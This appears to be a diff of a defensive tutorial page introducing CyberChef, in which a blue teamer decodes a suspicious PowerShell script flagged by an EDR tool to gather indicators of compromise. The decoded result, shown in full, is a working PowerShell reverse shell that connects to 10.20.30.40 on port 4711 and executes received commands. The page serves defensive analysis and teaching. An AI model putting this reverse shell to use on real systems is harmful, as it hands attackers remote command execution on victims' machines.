@@ -2,12 +2,11 @@
 layout: defense
 title: CyberChef Introduction       
 ---
+Below you'll find a quick introduction onto CyberChef, it's UI, and a example.
 
 CyberChef can be used to: Encode, Decode, Format data, Parse data, Encrypt, Decrypt, Compress data, Extract data, perform arithmetic functions against data, defang data, and many other functions.
 
-Below you'll find a quick introduction onto CyberChef, it's UI, and a example.
-
-## Short intro into the UI
+### Short intro into the UI
 
 After spinning up the [BenjiTrapp/boxed-cyberchef](https://github.com/BenjiTrapp/boxed-cyberchef) or [online version](https://gchq.github.io/CyberChef/) it's time to get get used to the UI of CyberChef.
 
@@ -29,7 +28,7 @@ Based on the picture from above, all sections can be described as:
 5. **Bake** - The magic button to run the Recipe and derive some output.
 
 
-## Let's cook something with CyberChef
+### Let's cook something with CyberChef
 
 As a blue teamer you receive an alert from your EDR tool, that detected the execution of a suspicious PowerShell script. To gather some IOCs, it's always a good idea to analyze the script.
 
@@ -81,6 +80,7 @@ Finally we got a result that is human readable:
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.20.30.40",4711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+### Summary
 
 To come back to our initial questions related to IOCs we can now dig deeper and summarize the following results:
 
